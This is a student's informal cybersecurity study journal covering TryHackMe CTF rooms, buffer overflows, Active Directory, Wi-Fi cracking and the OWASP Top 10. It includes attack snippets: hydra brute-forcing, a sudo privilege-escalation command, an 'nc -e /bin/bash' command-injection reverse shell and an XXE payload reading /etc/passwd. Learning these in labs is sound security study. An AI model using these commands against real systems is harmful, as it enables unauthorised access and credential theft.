Day 22:[03-12-2022]

Completed boiler ctf on tryhackme :)) xDD
did enumeration, and basic exploitation, command injection vuln and changed permissions n did priv esc.

Completed Agent sudo another ctf on tryhackme
in this i learnt to crack ftp password using hydra, change useragent n try to view site using burpsuite, mget to download all files, exiftool, binwalk, steghide
xxd cutie.png to convert img to hexdummp
binwalk -e cutie.png to extract
zip2john 8702.zip > hash.txt, john hash.txt, 7z e 8702.zip
steghide extract -sf cute-alien.jpg
sudo scp james@<target ip>:Alien_autospy.jpg ~/ ...to copy img frm ssh to device, rev img search
sudo -l to see wht priv a user has
then google to find cve 
sudo -u#-1 /bin/bash..then go to root directory n find flag!!!xp
hacking is fun ..hehe

Did LazyAdmin room on thm ..need to learn exploitation, rev shell n priv esc properly

Day 23:[04-12-2022]
Spiking:take a cmd eg: stats n do buffer overflow if sys crashes it means tht is vulnerable
enter cmds in vuln server
fuzzing:sending a bunch of char to a cmd n try to brk it..in spiking u do it to multiple cmds simultaneously in fuzzing its one particular cmd like trunk
some script n module ull hav to import
Finding offset: looking for where to write eip
patterncreate already existing tool for this by metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
overwrite eip ahhh idk im not understanding anything
this is some buffer overflow stuff nthng makes sense all mpmc bullshit
learn buffer overflow properly someday lol

Active directory:(imp ante)..used in many companies for identity mgmt
activ direc: like a phonebook storung info like objects like comp, user, printer ..used by windows, directory is called services
eg: login ge u need username pswd in diff places same ones are used ..u can authenticate arnd network using kerberos
components of AD:physical:domain controller:head of all servers,hosts phonebook, has all info, provides auth,
                          data store: contains pswd, hashed, ntds.dit file, accessible onli thr dom controller processes
                       
                  logical:AD schema: rulesbook, def of all objects
                          domains: to gp n manage objects in organisation
                          tree:gp of domains, forest: collection of trees
                          trusts, objects
                          
 Web application revisited: some more extra tools using Go language
 used to use sublister to find subdomains..now u can use assetfinder
 assetfinder domain name like assetfinder --subs-only tesla.com 
 gedit run.sh
 create a bash script to store it into a particular file in a directory
 
 Day 24:[05-12-22]
 to strt service in linu: sudo service apache2 start/stop
 sudo systemctl disable ssh
 Wireless pentest: assesment of wireless network..learn frm blogposts
 WPA2 PSK(pre share key):normal manedu..with passwd
 WPA2 enterprise: credentials, more advanced environment
 we'll do psk one: 
 activities performed:eval strength of psk,reviewing nearby networks,assessing guest networks,chking network access
 tools used:wireless card-to injcet n listen to pkts,router not connected to net, laptop connected to router
 watch tht video in peh to see live wifi hacking..first connect device, find bssid of n/w, use wordlists n aircrack-ng to hack the passwd
 process: place card into monitor mode,discover channel,bssid abt network,select n/w n capture data,perform deauth attack,capture wpa handshake,
 attempt to crk handshake
 
 extra enumeration tools:
 amass-finding subdomains, go tool
 httprobe to find alive domains..cat filename | httprobe -s -p https:443 =>port 443 li yavdella active ide antha ur chking
 GoWitness to screenshot websites..gowitness single https://tesla.com
 
 https://github.com/thatonetester/sumrecon
 https://pastebin.com/MhE6zXVt.. these two to automate enumeration process
 
 Day 25:[06-12-2022]
 Doing advent of cyber day5
 Remote Access Services:
 SSH stands for Secure Shell. It was initially used in Unix-like systems for remote login. It provides the user with a command-line interface 
 (CLI) that can be used to execute commands.

 RDP stands for Remote Desktop Protocol; it is also known as Remote Desktop Connection (RDC) or simply Remote Desktop (RD). 
 It provides a graphical user interface (GUI) to access an MS Windows system.
 When using Remote Desktop, the user can see their desktop and use the keyboard and mouse as if sitting at the computer.

 VNC stands for Virtual Network Computing. It provides access to a graphical interface which allows the user to view the desktop and (optionally)
 control the mouse and keyboard. VNC is available for any system with a graphical interface, including MS Windows, Linux, and even macOS, Android and Raspberry Pi.

 Authentication refers to the process where a system validates your identity.
 Password attacks:Shoulder Surfing,Password Guessing,Dictionary Attack,Brute Force Attack
 hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://10.10.2.131 ..mark is username bruteforce attack
 You can replace ssh with another protocol name, such as rdp, vnc, ftp, pop3 or any other protocol supported by Hydra.
 
 using Remmina to connect to VNC server..in vnc no username
 
 OWASP TOP 10:
 Lezgooo
 1.Injection attack:These flaws occur because user controlled input is interpreted as actual commands or parameters by the application.
 SQL Injection: This occurs when user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate
 the outcome of such queries. 
 Command Injection: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands
 Defence: Allow list[allowing onli safe input by comparing with set of char], Stripping input[dangerous char r removed frm input bfor processing]
 Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.  It is a web vulnerability that allows an\
 attacker to take advantage of that made system call to execute operating system commands on the server. 
 on application servers.
 ;nc -e /bin/bash to do reverse shell
 
 2.Broken Authentication:
 Session cookies are how the server keeps track of users
 Strong passwd, strong session cookies that cant be predictable, brute force attacks
 defence:strong passwd, automatic lockout after certain no of attempts,multi factor authentication
 eg:register with same username like admin again n view everything with username n passwd by logging in
 
 3.Sensitive data exposure:This is often data directly linked to customers (e.g. names, dates-of-birth, financial information, etc),
 but could also be more technical information, such as usernames and passwords.Also includes man in the middle attacks where attacker would force user
 connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information
 flat-file database:db stored in file in sys instead of servers to reduce storage size but it can be accessed n hacked n sensitive ifo can be exposed eg:sqlite db
 sqlite3 <database-name>, .tables, .help, PRAGMA table_info(customers); , SELECT * FROM customers; 
 do this to find db, see usernames n passwds and login after cracking hashes
 
 4.XML External Entity:
 An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external 
 systems that the application itself can access and can allow the attacker to read the file on that system
 1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
 2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and 
 attacker has to reflect the output of their XXE payload to some other file or their own server.
 
 XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and
 machine-readable. It is a markup language used for storing and transporting data. 
 xml code starts with prolog <?xml ...encoding..>
 DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document..used to define n validate xml 
 uses !doctype for root ele, !element for element and so on..
 
 eg: <?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
using this payload extracts contents of /etc/passwd by using system n file path puts it into read n displays it on screen
learn by doing payloads properly practical agi..

5.Broken Access Control:
To put simply, broken access control allows attackers to bypass authorization which can allow them to view sensitive data
or perform tasks as if they were a privileged user.
eg:Scenario #2: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page
Scenario #1: The application uses unverified data in a SQL call that is accessing account information:
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );

An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want.
If not properly verified, the attacker can access any user’s account.
http://example.com/app/accountInfo?acct=notmyacct
 
IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled,
to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

Day 26:[07-12-2022]
OWASP TOP 10 contd..last 5 to do..
6.Security misconfiguration:
Poorly configured permissions on cloud services, like S3 buckets
Having unnecessary features enabled, like services, pages, accounts or privileges
Default accounts with unchanged passwords..common in iot..
Error messages that are overly detailed and allow an attacker to find out more about the system
Not using HTTP security headers, or revealing too much detail in the Server: HTTP header

7.XSS:Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications.
It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.
3 types:
1.stored xss:malicious code in db of website..most dangerous
2.reflected xss:the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. 
To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
3.DOM-Based XSS - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change 
the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.
inject payload to do xss attack: u can find some stuff on XSS-Payloads.com (http://www.xss-payloads.com/)

8.Insecure Deserialization:converting serialised information into their complex form - an object that the application will understand is deserialisation.
Simply, insecure deserialization occurs when data from an untrusted party (I.e. a hacker) gets executed because there is no filtering or input validation; 
the system assumes that the data is trustworthy and will execute it no holds barred.
amel eneno ide taleg hoglilla learn off properly later :/

9.Components With Known Vulnerabilities ,Add file or text to cyberchef
eg:your company uses wordpress which is already vulnerable to some,Extract URLs kind of attack

10.Insufficient Logging and Monitoring:
The information stored in logs should include:HTTP status codes,Time Stamps,Usernames,API endpoints/page locations,IP addresses
else regulatory damage and risk of future attacks

Day 27:[09-12-2022]
continuing advent of cyber'22
Use cyberchef to do:
 Split URLs with @, Extract URLs,Find and Replace,Find and Remove Common Patterns,Defang URL:making it unclickable,
 Decode UTF-16,Decode base64, Drop Bytes,Remove Pattern, Extract strings,Add file or text to cyberchef
 
blockchain acts as a database to store information in a specified format and is shared among members of a network with no one entity in control,ledger distributed
among nodes of a peer-to-peer network., no central server so called decentralised,maintain integrity
Smart contracts are most commonly used as the backbone of DeFi applications (Decentralized Finance applications) to support a cryptocurrency on a blockchain. 
DeFi applications facilitate currency exchange between entities; a smart contract defines the details of the exchange. A smart contract is a program stored
on a blockchain that runs when pre-determined conditions are met.
onli certain functions defined in contract can accesss attributes tht are pvt imagine smart contract as a class
eg: to transfer 1 ethereum frm A to B, If we controlled Contract A and Contract B wanted to first deposit 1 Ethereum, and then withdraw 1 Ethereum from Contract A,
Contract B calls the deposit function of Contract A.
Contract A authorizes the deposit after checking if any pre-determined conditions need to be met.
Contract B calls the withdraw function of Contract A.
Contract A authorizes the deposit if the pre-determined conditions for withdrawal are met.
Contract B can execute other functions after the Ether is sent from Contract A but before the function resolves.

Most smart contract vulnerabilities arise due to logic issues or poor exception handling.
Most vulnerabilities arise in functions when conditions are insecurely implemented through the previously mentioned issues.
eg:balance>0 is not proper condition coz multiple fn calls can occur bfor one is completed so evn if bal is less thn 0, itll work
re-entrancy occurs when a malicious contract uses a fallback function to continue depleting a contract's total balance due to flawed 
logic after an initial withdraw function occurs

Do agent T and Quotient rooms

Day 28:[17-12-22]..couldnt do for a week coz of internals n pb test n all
Advent of cyber contd.
Day 15 n 16:Secure coding
Input validation:input or files uploaded hav to be validated sumne eladinu allow madidre it can lead to vulnerabilities
Unrestricted File Uploads usually have two main exploitation paths:

If the attacker can retrieve the uploaded file, it could lead to code execution if the attacker uploads a file such as a web shell.
If the file is viewed by a user, think of a CV application, then an attacker could embed malware in the uploaded file that would
execute on the user's workstation once they view the file.

in this onli pdf files are allowed to be added n not exe files
.net applictaion allows asp,aspx,cshtml to be executed after running a set of instructions so in this u can add of reverse shell code
If this file was stored in the web root, we could request the file from the server, forcing the server to execute the code within our 
file before sending the response. It would be possible to get remote code execution on the web server. 

file extension validation has to be done n file renaming n malicious code cn be prevented by malware scanning by using clamAV or else u can upload a payload, 
establish reverse shell n gain access using metasploit easily.

SQLi:
$server="db";
$user="logistics_user";
$pwd="somePass123";
$schema="logistics";

$db=mysqli_connect($server,$user,$pwd,$schema);
to establish php connection to sql
$query="select * from users where id=1";
$elves_rs=mysqli_query($db,$query);

$query="select * from users where id=".$_GET['id'];
$elves_rs=mysqli_query($db,$query);
to fetch data but this is sqli
eg: in url onli u can put where id=-1 or id=4 itll convert into sql query and dispaly id 4 ka contents
intval() function. This function will take a string and try to convert it into an integer. If no valid integer is found on the string, it will return 0,
$query="select * from users where id=".intval($_GET['id']);
That way, even if the attacker sends an SQL injection payload via the id parameter, the app will try converting it to an integer before 
concatenating it as part of the SQL statement. In the worst-case scenario, the string gets converted to a 0, which is still harmless in this particular case.
$stmt = mysqli_prepare($db, $query); mysqli_stmt_bind_param(); instead of blindly concatenating strings, it chks if it shud allow parameters to be bound or not
sqli fix madad kaltko do those port swigger stuff

completed till 24th dec, advent of cyber'22 done!

took a brk.. learn basic concepts in dev like api's, protocols, servers,sockets, docker, container n all..n do some related project
try applying for gsoc..decide org n all..will continue in march'23.
